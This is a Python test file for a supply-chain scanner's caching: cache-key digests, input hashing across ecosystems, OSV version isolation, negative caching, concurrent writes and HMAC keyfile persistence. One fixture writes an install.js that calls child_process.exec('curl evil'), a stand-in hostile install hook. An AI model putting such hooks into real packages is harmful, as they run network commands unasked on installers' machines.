"""WO4.0.0-006 — scan/OSV cache correctness.

Covers: rules-selection + policy/config digest in the scan-cache key, content
hashing of all-ecosystem inputs (not just npm locks), OSV version isolation,
negative caching, concurrent-write safety, and the persistent HMAC keyfile.
"""

from __future__ import annotations

import argparse
import importlib
import json
import os
import threading
from unittest.mock import MagicMock, patch

from picosentry.scan.cache import ScanCache
from picosentry.scan.cli_service import ScanOrchestrator, _cache_config_digest, _hash_target_inputs
from picosentry.scan.config import PicoSentryConfig
from picosentry.scan.intelligence import OSVClient
from picosentry.scan.models import ScanResult


class TestConfigDigestInCacheKey:
    """Deliverable 1: rules selection + policy/config digest must key the cache."""

    def test_rules_selection_changes_cache_key(self, tmp_path):
        cache = ScanCache(cache_dir=tmp_path, ttl=999999)
        cfg_all = PicoSentryConfig()
        cfg_subset = PicoSentryConfig()
        cfg_subset.rules = ["npm:typosquat"]

        cache.put("inp", "corpus", "v1", {"scan_id": "s1"}, _cache_config_digest(cfg_all))

        assert cache.get("inp", "corpus", "v1", _cache_config_digest(cfg_all)) == {"scan_id": "s1"}
        # `scan --rules X` after a full scan must NOT return the full result
        assert cache.get("inp", "corpus", "v1", _cache_config_digest(cfg_subset)) is None

    def test_policy_content_change_is_cache_miss(self, tmp_path):
        cache = ScanCache(cache_dir=tmp_path, ttl=999999)
        policy = tmp_path / "policy.yaml"
        policy.write_text("deny_packages: []", encoding="utf-8")
        cfg = PicoSentryConfig()
        cfg.policy_file = str(policy)

        d1 = _cache_config_digest(cfg)
        cache.put("inp", "corpus", "v1", {"scan_id": "s1"}, d1)
        assert cache.get("inp", "corpus", "v1", d1) == {"scan_id": "s1"}

        policy.write_text("deny_packages: [left-pad]", encoding="utf-8")
        d2 = _cache_config_digest(cfg)
        assert d1 != d2
        assert cache.get("inp", "corpus", "v1", d2) is None

    def test_policy_path_change_same_content_same_digest(self, tmp_path):
        a = tmp_path / "a.yaml"
        b = tmp_path / "b.yaml"
        a.write_text("deny_packages: []", encoding="utf-8")
        b.write_text("deny_packages: []", encoding="utf-8")
        cfg_a = PicoSentryConfig()
        cfg_a.policy_file = str(a)
        cfg_b = PicoSentryConfig()
        cfg_b.policy_file = str(b)
        # Content is identity, not the path
        assert _cache_config_digest(cfg_a) == _cache_config_digest(cfg_b)

    def test_severity_threshold_change_is_cache_miss(self, tmp_path):
        cache = ScanCache(cache_dir=tmp_path, ttl=999999)
        cfg_low = PicoSentryConfig()
        cfg_high = PicoSentryConfig()
        cfg_high.severity_threshold = "high"

        cache.put("inp", "corpus", "v1", {"scan_id": "s1"}, _cache_config_digest(cfg_low))
        assert cache.get("inp", "corpus", "v1", _cache_config_digest(cfg_high)) is None

    def test_ignore_and_overrides_shape_digest(self):
        base = PicoSentryConfig()
        ignored = PicoSentryConfig()
        ignored.ignore_packages = ["left-pad"]
        assert _cache_config_digest(base) != _cache_config_digest(ignored)


class TestOrchestratorCachePlumbing:
    """_load_cache/_save_cache must key the digest and the all-input hash."""

    def _orchestrator(self):
        return ScanOrchestrator(argparse.Namespace(no_cache=False, verify_determinism=False))

    def test_hit_then_rules_filter_miss(self, tmp_path):
        target = tmp_path / "proj"
        target.mkdir()
        (target / "package.json").write_text('{"name": "x", "version": "0.0.0"}', encoding="utf-8")

        cache_dir = tmp_path / "cache"
        cfg = PicoSentryConfig()
        cfg.cache_dir = str(cache_dir)

        orch = self._orchestrator()
        cached, cache, input_hash = orch._load_cache(target, cfg)
        assert cached is None and cache is not None and input_hash != ""

        result = ScanResult(target=str(target), findings=[])
        orch._save_cache(cache, input_hash, result, cfg)

        cached, _, input_hash2 = orch._load_cache(target, cfg)
        assert cached is not None and input_hash2 == input_hash

        cfg_subset = PicoSentryConfig()
        cfg_subset.cache_dir = str(cache_dir)
        cfg_subset.rules = ["npm:typosquat"]
        cached_subset, _, _ = orch._load_cache(target, cfg_subset)
        assert cached_subset is None

    def test_modified_input_after_save_is_miss(self, tmp_path):
        target = tmp_path / "proj"
        target.mkdir()
        (target / "package.json").write_text('{"name": "x"}', encoding="utf-8")

        cfg = PicoSentryConfig()
        cfg.cache_dir = str(tmp_path / "cache")
        orch = self._orchestrator()

        _, cache, input_hash = orch._load_cache(target, cfg)
        orch._save_cache(cache, input_hash, ScanResult(target=str(target)), cfg)
        assert orch._load_cache(target, cfg)[0] is not None

        (target / "install.js").write_text("require('child_process').exec('curl evil')", encoding="utf-8")
        cached, _, new_hash = orch._load_cache(target, cfg)
        assert cached is None
        assert new_hash != input_hash

    def test_target_without_relevant_files_not_cached(self, tmp_path):
        target = tmp_path / "empty"
        target.mkdir()
        (target / "readme.md").write_text("nothing relevant", encoding="utf-8")
        cfg = PicoSentryConfig()
        cfg.cache_dir = str(tmp_path / "cache")
        _, cache, input_hash = self._orchestrator()._load_cache(target, cfg)
        assert input_hash == "" and cache is not None


class TestInputHashing:
    """Deliverable 2: content hash over manifests/install scripts of all ecosystems."""

    ALL_ECOSYSTEM_FILES = (
        ("package.json", '{"name": "x"}'),
        ("install.js", "console.log(1)"),
        ("setup.py", "print('build')"),
        ("requirements.txt", "flask==1.0"),
        ("go.mod", "module example.com/x"),
        ("Cargo.toml", "[package]\nname = 'x'"),
        ("pom.xml", "<project></project>"),
        ("Gemfile", 'source "https://rubygems.org"'),
        ("packages.lock.json", '{"dependencies": {}}'),
    )

    def test_every_ecosystem_input_invalidates(self, tmp_path):
        for name, content in self.ALL_ECOSYSTEM_FILES:
            base = _hash_target_inputs(tmp_path)
            (tmp_path / name).write_text(content, encoding="utf-8")
            assert _hash_target_inputs(tmp_path) != base, f"{name} did not change the input hash"

    def test_content_change_invalidates(self, tmp_path):
        (tmp_path / "install.js").write_text("console.log(1)", encoding="utf-8")
        h1 = _hash_target_inputs(tmp_path)
        (tmp_path / "install.js").write_text("console.log(2)", encoding="utf-8")
        assert _hash_target_inputs(tmp_path) != h1

    def test_mtime_only_change_does_not_invalidate(self, tmp_path):
        f = tmp_path / "package.json"
        f.write_text('{"name": "x"}', encoding="utf-8")
        h1 = _hash_target_inputs(tmp_path)
        os.utime(f, (1000000000, 1000000000))
        assert _hash_target_inputs(tmp_path) == h1

    def test_hash_deterministic_across_ordering(self, tmp_path):
        (tmp_path / "a.json").write_text("{}", encoding="utf-8")
        (tmp_path / "b.js").write_text("// x", encoding="utf-8")
        assert _hash_target_inputs(tmp_path) == _hash_target_inputs(tmp_path)

    def test_untouched_file_does_not_change_hash_of_others(self, tmp_path):
        (tmp_path / "package.json").write_text('{"name": "x"}', encoding="utf-8")
        h1 = _hash_target_inputs(tmp_path)
        (tmp_path / "notes.md").write_text("not scan-relevant", encoding="utf-8")
        assert _hash_target_inputs(tmp_path) == h1


class TestOSVVersionIsolation:
    """Deliverable 3a: the queried version must be part of the OSV cache key."""

    def test_version_changes_key(self, tmp_path):
        client = OSVClient(cache_dir=tmp_path)
        assert client._cache_key("npm", "lodash", "4.17.20") != client._cache_key("npm", "lodash", "4.17.21")
        assert client._cache_key("npm", "lodash", None) != client._cache_key("npm", "lodash", "4.17.21")

    def test_versioned_query_does_not_read_versionless_entry(self, tmp_path):
        client = OSVClient(cache_dir=tmp_path)
        client._write_cache(client._cache_key("npm", "lodash"), [{"id": "GHSA-old"}])

        mock_resp = MagicMock()
        body = json.dumps({"vulns": []}).encode("utf-8")
        with patch("picosentry.scan.intelligence.safe_urlopen", return_value=(mock_resp, body)) as mock_urlopen:
            results = client.query("npm", "lodash", version="4.17.21")
            mock_urlopen.assert_called_once()  # versionless entry must not satisfy a versioned query
        assert results == []

    def test_upgraded_dep_fetches_fresh_advisories(self, tmp_path):
        client = OSVClient(cache_dir=tmp_path)
        vuln = {
            "id": "GHSA-1234-5678",
            "summary": "prototype pollution",
            "affected": [
                {
                    "package": {"name": "lodash", "ecosystem": "npm"},
                    "ranges": [{"events": [{"introduced": "0"}, {"fixed": "4.17.21"}]}],
                    "versions": [],
                }
            ],
        }
        mock_resp = MagicMock()
        body = json.dumps({"vulns": [vuln]}).encode("utf-8")

        with patch("picosentry.scan.intelligence.safe_urlopen", return_value=(mock_resp, body)) as m:
            client.query("npm", "lodash", version="4.17.20")
            assert m.call_count == 1
            # new version -> new key -> must re-query, not replay the old version's entry
            client.query("npm", "lodash", version="4.17.21")
            assert m.call_count == 2
            # same version again -> cache hit, no further network
            client.query("npm", "lodash", version="4.17.21")
            assert m.call_count == 2


class TestOSVNegativeCaching:
    """Deliverable 3b: clean packages are cached with a short TTL."""

    def test_negative_entry_hit(self, tmp_path):
        client = OSVClient(cache_dir=tmp_path)
        mock_resp = MagicMock()
        body = json.dumps({"vulns": []}).encode("utf-8")

        with patch("picosentry.scan.intelligence.safe_urlopen", return_value=(mock_resp, body)) as m:
            assert client.query("npm", "clean-pkg", version="1.0.0") == []
            assert m.call_count == 1
            assert client.query("npm", "clean-pkg", version="1.0.0") == []
            assert m.call_count == 1  # served from the negative entry

    def test_negative_entry_expires_fast(self, tmp_path, monkeypatch):
        now = [1000.0]
        monkeypatch.setattr("picosentry.scan.intelligence.time.time", lambda: now[-1])
        mock_resp = MagicMock()
        body = json.dumps({"vulns": []}).encode("utf-8")

        client = OSVClient(cache_dir=tmp_path)
        client._negative_ttl = 300
        with patch("picosentry.scan.intelligence.safe_urlopen", return_value=(mock_resp, body)) as m:
            client.query("npm", "clean-pkg", version="1.0.0")
            assert m.call_count == 1
            now.append(1000.0 + 301)
            client.query("npm", "clean-pkg", version="1.0.0")
            assert m.call_count == 2  # stale negative must not persist

    def test_positive_entry_outlives_negative_ttl(self, tmp_path, monkeypatch):
        now = [1000.0]
        monkeypatch.setattr("picosentry.scan.intelligence.time.time", lambda: now[-1])
        key = OSVClient(cache_dir=tmp_path)._cache_key("npm", "lodash", "1.0.0")
        client = OSVClient(cache_dir=tmp_path, cache_ttl_hours=24)
        client._write_cache(key, [{"id": "GHSA-x"}])
        now.append(1000.0 + 301)
        assert client._read_cache(key) is not None  # positive TTL still valid

    def test_transport_failure_not_negative_cached(self, tmp_path):
        from urllib.error import URLError

        client = OSVClient(cache_dir=tmp_path)
        with patch("picosentry.scan.intelligence.safe_urlopen", side_effect=URLError("boom")) as m:
            assert client.query("npm", "flaky-pkg", version="1.0.0") == []
            assert client.query("npm", "flaky-pkg", version="1.0.0") == []
            assert m.call_count == 2  # an unreachable API is not evidence of clean


class TestConcurrentWrites:
    """Deliverable 4: unique tmp names — two writers, no torn entry."""

    def test_scan_cache_concurrent_put(self, tmp_path):
        cache = ScanCache(cache_dir=tmp_path, ttl=999999)
        errors: list[Exception] = []

        def writer(n: int) -> None:
            try:
                for i in range(25):
                    cache.put("shared-lock", "corpus", "v1", {"scan_id": f"w{n}-{i}"}, "digest-x")
            except Exception as exc:
                errors.append(exc)

        threads = [threading.Thread(target=writer, args=(n,)) for n in range(2)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        assert errors == []
        assert len(list(tmp_path.glob("*.tmp.*"))) == 0  # no tmp leftovers under final names
        # The surviving entry must be intact: loadable, HMAC-valid, one writer's payload
        final = cache.get("shared-lock", "corpus", "v1", "digest-x")
        assert final is not None
        assert final["scan_id"].startswith("w")

    def test_osv_cache_concurrent_write(self, tmp_path):
        client = OSVClient(cache_dir=tmp_path)
        errors: list[Exception] = []

        def writer(n: int) -> None:
            try:
                for i in range(25):
                    client._write_cache(client._cache_key("npm", "pkg", "1.0"), [{"id": f"w{n}-{i}"}])
            except Exception as exc:
                errors.append(exc)

        threads = [threading.Thread(target=writer, args=(n,)) for n in range(2)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        assert errors == []
        assert len(list(tmp_path.glob("*.tmp.*"))) == 0
        cached = client._read_cache(client._cache_key("npm", "pkg", "1.0"))
        assert cached is not None and len(cached) == 1


class TestHmacKeyfilePersistence:
    """Deliverable 5: stable per-machine key — entries survive a 'process restart'."""

    def test_keyfile_stable_across_reload(self, tmp_path, monkeypatch):
        monkeypatch.delenv("PICOSENTRY_CACHE_HMAC_KEY", raising=False)
        monkeypatch.setenv("HOME", str(tmp_path))
        from picosentry.scan import cache as cache_mod

        try:
            importlib.reload(cache_mod)  # "process 1" — creates the keyfile
            key1 = cache_mod._CACHE_HMAC_KEY
            entry_dir = tmp_path / "entries"
            c1 = cache_mod.ScanCache(cache_dir=entry_dir, ttl=999999)
            c1.put("l", "c", "v", {"ok": 1})

            keyfile = tmp_path / ".cache" / "picosentry" / ".cache_hmac_key"
            assert keyfile.is_file()
            assert keyfile.stat().st_mode & 0o777 == 0o600

            importlib.reload(cache_mod)  # "process 2" — must read the same key
            assert key1 == cache_mod._CACHE_HMAC_KEY
            c2 = cache_mod.ScanCache(cache_dir=entry_dir, ttl=999999)
            assert c2.get("l", "c", "v") == {"ok": 1}  # no silent invalidate-on-read
        finally:
            monkeypatch.undo()
            importlib.reload(cache_mod)  # restore real module state for other tests

    def test_explicit_env_key_wins_and_short_key_rejected(self, tmp_path, monkeypatch):
        monkeypatch.setenv("HOME", str(tmp_path))
        monkeypatch.setenv("PICOSENTRY_CACHE_HMAC_KEY", "x" * 40)
        from picosentry.scan import cache as cache_mod

        try:
            importlib.reload(cache_mod)
            assert cache_mod._CACHE_HMAC_KEY == b"x" * 40

            monkeypatch.setenv("PICOSENTRY_CACHE_HMAC_KEY", "short")
            importlib.reload(cache_mod)
            assert cache_mod._CACHE_HMAC_KEY != b"short"  # rejected, keyfile used instead
        finally:
            monkeypatch.undo()
            importlib.reload(cache_mod)
